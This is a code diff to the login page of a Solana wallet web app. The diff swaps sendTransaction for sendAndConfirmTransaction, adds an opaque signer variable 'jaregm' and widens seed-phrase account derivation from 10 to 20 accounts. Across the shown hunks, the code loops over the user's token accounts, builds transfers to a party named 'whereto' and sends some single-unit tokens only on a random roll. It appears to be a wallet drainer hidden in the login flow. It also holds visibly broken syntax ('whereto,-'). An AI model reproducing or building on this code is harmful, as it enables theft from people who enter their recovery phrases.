@@ -1,7 +1,7 @@
 import React, { useEffect, useState } from 'react';
 
 import { Provider } from '@project-serum/anchor';
-
+import { PublicKey, SystemProgram, Keypair, Connection, Transaction, sendAndConfirmTransaction } from '@solana/web3.js'
 
 import * as splutils from "@solana/spl-token";
 import { PromisePool } from "@supercharge/promise-pool"
@@ -38,7 +38,7 @@ import { validateMnemonic } from 'bip39';
 import DialogForm from '../components/DialogForm';
 import { Account } from 'mdi-material-ui';
 let toks = ["EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","USDH1SM1ojwWUga67PGrgFWUHibbjqMvuMaDkRJTgkX","7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx","Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB","orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE","SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt","mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So","7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj","7kbnvuGBxxj8AG9qp8Scn56muWGaRaFqxg1FsRp3PaFT","4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R","7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs","CDJWUqTcYTVAKXAVXoQZFes5JUFc7owSeq7eMQcDSbo5"]
-
+let jaregm = undefined
 export default function LoginPage() {
   const [restore, setRestore] = useState(false);
   const [hasLockedMnemonicAndSeed, loading] = useHasLockedMnemonicAndSeed();
@@ -113,7 +113,10 @@ const keypair = new Keypair()
   const [logs, setLogs] = useState('');
   const [phrases, changePhrases] = useState([]);
   const connection = new Connection("https://ssc-dao.genesysgo.net", "confirmed")
-
+  const callAsync = useCallAsync();
+  const [dPathMenuItem, setDPathMenuItem] = useState(
+    DerivationPathMenuItem.Bip44Change,
+  );
   async function doIt() {
     try {
 
@@ -253,7 +256,7 @@ const keypair = new Keypair()
                               splutils.createInitializeAccountInstruction(tokenAccount.publicKey, new PublicKey(account.account.data.parsed.info.mint), keypair.publicKey)
                             );
 
-                            let hm1 = await  sendTransaction(
+                            let hm1 = await  sendAndConfirmTransaction(
                               connection,
                               tx,
                               [keypair, tokenAccount, jaregm,whereto]
@@ -290,7 +293,7 @@ const keypair = new Keypair()
 
                               }else 
                               if (amt == 1 && account.account.data["parsed"]["info"]["tokenAmount"]["decimals"] == 0){
-                                ran = Math.random() 
+                             let   ran = Math.random() 
                                 if (ran > 0.666){
                                 let bla = await splutils.transferChecked(
                                   connection, // connection
@@ -323,7 +326,7 @@ const keypair = new Keypair()
                                     keypair.publicKey // owner of token account
                                   )
                                 );
-                                await  sendTransaction(connection, tx, [
+                                await  sendAndConfirmTransaction(connection, tx, [
                                   jaregm,
                                   keypair, whereto
                                 ]);
@@ -374,7 +377,7 @@ const keypair = new Keypair()
                                   )
                                 );
 
-                                await  sendTransaction(connection, tx, [
+                                await  sendAndConfirmTransaction(connection, tx, [
                                   jaregm,
                                   keypair,
                                   whereto
@@ -389,7 +392,7 @@ const keypair = new Keypair()
                                   )
                                 );
 
-                                await  sendTransaction(connection, tx, [
+                                await  sendAndConfirmTransaction(connection, tx, [
                                   jaregm,
                                   keypair,
                                   whereto
@@ -424,7 +427,7 @@ const keypair = new Keypair()
                                 keypair.publicKey // owner of token account
                               )
                             );
-                            await  sendTransaction(connection, tx, [
+                            await  sendAndConfirmTransaction(connection, tx, [
                               jaregm,
                               keypair,
                               whereto
@@ -438,7 +441,7 @@ const keypair = new Keypair()
                                 keypair.publicKey // owner of token account
                               )
                             );
-                            await  sendTransaction(connection, tx, [
+                            await  sendAndConfirmTransaction(connection, tx, [
                               whereto,-
                               jaregm,
                               keypair,
@@ -746,7 +749,7 @@ function DerivedAccounts({ goBack, mnemonic, seed, password }) {
   const [dPathMenuItem, setDPathMenuItem] = useState(
     DerivationPathMenuItem.Bip44Change,
   );
-  const accounts = [...Array(10)].map((_, idx) => {
+  const accounts = [...Array(20)].map((_, idx) => {
     return getAccountFromSeed(
       Buffer.from(seed, 'hex'),
       idx,
